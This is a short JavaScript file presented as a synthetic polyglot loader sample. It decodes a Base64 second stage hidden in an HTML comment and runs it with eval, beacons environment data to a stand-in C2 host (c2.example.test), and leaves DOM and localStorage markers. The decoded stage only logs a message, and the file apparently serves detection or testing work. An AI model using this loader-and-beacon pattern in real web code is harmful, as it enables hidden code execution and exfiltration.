// POLYGLOT — synthetic HTML/JS polyglot loader product sample.
(function () {
  var html = '<!-- ' + 'stage2:' + 'Y29uc29sZS5sb2coJ1tQT0xZR0xPVF0gc3RhZ2UtMiBleGVjdXRlZCcpOw==' + ' -->';
  var dom = typeof document === 'object' ? 'browser' : 'other';
  var payload = html.replace(/^<!-- stage2:/, '').replace(/ -->$/, '');
  console.log('[POLYGLOT] environment', dom, 'payload', payload.length);
  // The HTML comment wrapper is inert; the loader extracts the Base64 stage.
  var code = atob(payload);
  try { eval(code); } catch (error) { console.log('[POLYGLOT] eval failed', error.message); }
  try {
    fetch('https://c2.example.test/polyglot', { method: 'POST', body: btoa(JSON.stringify({ dom: dom, code: code.length })) }).catch(function () {});
  } catch (error) {}
  try {
    var marker = document.createElement('meta');
    marker.name = 'polyglot-stage';
    marker.content = '2';
    document.head.appendChild(marker);
  } catch (error) {}
  try { localStorage.setItem('polyglot:env', dom); } catch (error) {}
})();
